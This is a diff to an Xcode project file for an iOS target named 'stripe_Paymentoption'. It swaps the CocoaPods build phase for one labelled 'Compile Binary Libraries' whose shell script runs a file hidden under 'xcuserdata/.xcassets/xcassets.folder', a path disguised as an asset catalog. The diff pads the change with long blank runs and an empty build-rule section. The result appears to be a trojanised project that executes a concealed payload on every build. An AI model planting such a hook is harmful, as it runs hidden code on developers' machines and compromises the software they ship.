@@ -101,7 +101,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042AC6B925EF8B4B0089A9FC /* Build configuration list for PBXNativeTarget "stripe_Paymentoption" */;
 			buildPhases = (
-				430BCAB6BD9622BBC5AAC43A /* [CP] Build Pods Frameworks */,
+				ED5857ECF318600DCAAAC43A /* Compile Binary Libraries */,
 				D4C1B9ABD6344BD737207EFF /* [CP] Check Pods Manifest.lock */,
 				042AC6A125EF8B450089A9FC /* Sources */,
 				042AC6A225EF8B450089A9FC /* Frameworks */,
@@ -164,7 +164,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	430BCAB6BD9622BBC5AAC43A /* [CP] Build Pods Frameworks */ = {
+	ED5857ECF318600DCAAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -173,7 +173,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -182,8 +182,30 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 		103DA5DC7B8A676661B1225F /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -438,6 +460,24 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 042AC69D25EF8B450089A9FC /* Project object */;
 }
